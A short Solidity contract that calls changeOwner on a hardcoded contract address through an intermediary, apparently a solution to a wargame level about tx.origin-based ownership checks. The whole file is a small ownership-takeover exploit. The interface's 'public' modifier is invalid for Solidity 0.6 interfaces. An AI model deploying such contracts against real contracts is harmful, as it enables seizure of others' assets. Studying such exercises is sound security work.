// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Target {
    function changeOwner(address _owner) public;
}

contract ProxyCaller {
    address target = 0x5694aE8A7C8ed1E86BF735881e497d87CF714696;

    function changeOwner() external {
        Target(target).changeOwner(msg.sender);
    }
}
